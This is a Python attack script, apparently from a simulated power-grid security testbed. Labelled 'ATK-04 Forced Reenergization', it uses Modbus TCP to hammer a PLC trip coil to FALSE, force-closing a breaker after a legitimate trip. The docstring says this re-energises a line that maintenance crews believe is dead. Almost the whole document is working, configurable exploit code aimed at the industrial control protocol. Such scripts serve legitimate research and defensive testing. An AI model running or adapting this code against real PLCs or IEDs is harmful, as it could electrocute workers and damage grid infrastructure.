#!/usr/bin/env python3
"""
ATK-04 | Forced Reenergization
================================
After the PLC legitimately trips a breaker (e.g. due to a real fault or an
ATK-01 FDIA), field engineers open the physical breaker and begin repair work
on the de-energised line.  This attack *re-closes* the breaker by writing
FALSE back to the PLC output coil (%QX0.0), causing current to flow onto a
line that maintenance workers believe is dead — a dangerous safety violation.

In simulation terms: the Pandapower switch is re-closed via the coil state
→ physics engine resumes current flow on the faulted branch.

Attack flow
-----------
  1. Read coil — confirm breaker is currently OPEN (trip was successful).
  2. Hammer coil → FALSE (close breaker command) repeatedly.
  3. Physics engine detects coil=False → marks line closed → power flows again.

Register map
------------
  Coil 0  (%QX0.0)  —  Trip_Command
    After legitimate trip : coil = True  (1)
    After this attack     : coil = False (0)  ← breaker forced CLOSED

Usage
-----
    python atk04_forced_reenergization.py
    python atk04_forced_reenergization.py --target 127.0.0.1 --port 5020 --coil 0 --sustain 8
"""
import argparse
import time
from pymodbus.client import ModbusTcpClient


def main():
    parser = argparse.ArgumentParser(
        description="ATK-04: Force-close a breaker after a legitimate trip (forced reenergization)."
    )
    parser.add_argument("--target",  type=str,   default="127.0.0.1",
                        help="Target IED IP address")
    parser.add_argument("--port",    type=int,   default=5020,
                        help="Target IED Modbus TCP port  (default 5020 = IED-1)")
    parser.add_argument("--coil",    type=int,   default=0,
                        help="Coil address  (default 0 = %QX0.0 Trip_Command)")
    parser.add_argument("--sustain", type=float, default=8.0,
                        help="Seconds to sustain false close (default 8 s)")
    args = parser.parse_args()

    print("=" * 60)
    print("  ATK-04  |  Forced Reenergization")
    print("=" * 60)
    print(f"[*] Target IED   : {args.target}:{args.port}")
    print(f"[*] Output coil  : address {args.coil}")
    print(f"[*] Sustain time : {args.sustain} s")
    print()

    client = ModbusTcpClient(args.target, port=args.port)
    if not client.connect():
        print("[-] FAILED: Could not connect. Is the IED container running?")
        return

    # Verify that the breaker is currently OPEN (trip_command = True)
    read_result = client.read_coils(args.coil, count=1)
    if not read_result.isError():
        is_tripped = read_result.bits[0]
        if not is_tripped:
            print("[!] WARNING: Breaker appears to be CLOSED already (coil=False).")
            print("[!] For maximum realism run ATK-01 or ATK-03 first to trip it.")
            print("[!] Proceeding anyway…\n")
        else:
            print(f"[+] Confirmed: breaker is OPEN (Trip_Command=True) — ready to forced-close.")
    else:
        print("[!] Could not read coil — proceeding anyway.")

    print(f"\n[*] Writing coil {args.coil} → FALSE (force-close breaker) …")
    deadline  = time.time() + args.sustain
    iteration = 0

    try:
        while time.time() < deadline:
            response = client.write_coil(args.coil, False)
            if response.isError():
                print(f"[-] Coil write error on iteration {iteration}: {response}")
                break
            iteration += 1
            time.sleep(0.05)

        print(f"\n[+] ATTACK COMPLETE: Force-closed breaker for {args.sustain} s ({iteration} writes)")
        print("[+] Faulted line has been re-energised — maintenance scenario violated.")
        print("[+] Check the SCADA dashboard: breaker should flip back to CLOSED.")

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    except Exception as e:
        print(f"[-] Exception: {e}")
    finally:
        client.close()
        print("[*] Modbus connection closed.")


if __name__ == "__main__":
    main()
